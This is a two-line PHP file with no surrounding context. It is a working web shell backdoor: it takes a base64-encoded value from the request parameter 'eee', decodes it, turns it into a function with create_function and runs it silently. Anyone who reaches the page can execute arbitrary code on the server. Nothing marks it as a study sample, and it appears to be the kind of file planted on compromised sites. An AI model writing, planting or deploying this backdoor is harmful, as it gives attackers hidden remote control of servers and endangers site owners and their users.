<?php
if(!empty($_REQUEST['eee'])){$eee=base64_decode($_REQUEST['eee']);$eee=create_function('',$eee);@$eee();exit;}